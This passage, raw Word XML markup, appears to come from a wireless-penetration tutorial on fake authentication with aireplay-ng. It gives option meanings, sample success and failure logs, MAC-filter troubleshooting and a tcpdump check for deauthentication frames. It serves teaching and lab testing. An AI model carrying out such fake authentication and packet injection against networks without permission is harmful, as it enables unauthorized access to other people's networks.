    <w:p w14:paraId="1AFCDBFC"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71901F58" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>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6000 - </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Reauthenticate</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> very 6000 seconds. The long period also causes keep alive packets to be sent.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="410F7A24" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>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o</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1 - Send only one set of packets at a time. Default is multiple and this confuses some APs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09CD84A2" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>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q</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 10 - Send keep alive packets every 10 seconds.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C65EE41" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D71FE51"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Success looks like:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="793646EF"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18:22:32  Sending</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Authentication Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="324C330A"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18:22:32  Authentication</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> successful</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="304ED5FC"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18:22:32  Sending</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Association Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B73E5BC"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18:22:32  Association</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> successful :-)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08413830"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18:22:42  Sending</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> keep-alive packet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49154993"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18:22:52  Sending</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> keep-alive packet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50B478D3"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r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>and</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> so on.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="368C0A20" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00F37B2B" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Here is an example of what a failed authentication looks like:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="356D2E70"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8:28:02  Sending</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Authentication Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="389B5D19"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18:28:02  Authentication</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> successful</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B4F5CD4"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18:28:02  Sending</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Association Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EA8F533"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18:28:02  Association</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> successful :-)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62D38A9B"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18:28:02  Got</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>deauthentication</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6879377F"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18:28:05  Sending</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Authentication Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D52DF27"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18:28:05  Authentication</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> successful</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F4790BE"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18:28:05  Sending</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Association Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37889DFE"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18:28:10  Sending</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Authentication Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F21F25E"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18:28:10  Authentication</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> successful</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="245BB281" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00F37B2B" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>18:28:10  Sending</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Association Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CDBB4BC"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Notice the “Got a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>deauthentication</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet” and the continuous retries above. Do not proceed to the next step until you have the fake authentication running correctly.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43B18124" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0BB40AD6" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Troubleshooting Tips</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15107588" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>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Some access points are configured to only allow selected MAC addresses to associate and connect. If this is the case, you will not be able to successfully do fake authentication unless you know one of the MAC addresses on the allowed list. See the MAC access </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>control troubleshooting</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> tip </w:t>
      </w:r>
      <w:hyperlink r:id="rId6" w:anchor="troubleshooting_tips" w:history="1">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="107902"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>here</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3379A851" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>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If at any time you wish to confirm you are properly associated is to use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tcpdump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> and look at the packets. Start another session and…</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D3AF0F5"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Run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="393AD66C" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2140CAE6" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="008D1EBD" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tcpdump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -n -e -s0 -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>vvv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DB48EFA" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="002A541E" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22DDFA38"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Here is a typical </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tcpdump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> error message you are looking for:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38D4F150" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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11:04:34.360700 314us BSSID:00:14:6c</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>:7e:40:80</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> DA:00:09:5B:EC:EE:F2 SA:00:14:6c:7e:40:80   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DeAuthentication</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">: Class 3 frame received from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>nonassociated</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> station</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C3A6207" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46CF89D3"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Notice that the access point (00:14:6c</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>:7e:40:80</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>) is telling the source (00:09:5B:EC:EE:F2) you are not associated. Meaning, the AP will not process or accept the injected packets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22E730FB"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If you want to select only the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DeAuth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packets with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tcpdump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> then you can use: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A4ED20C" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
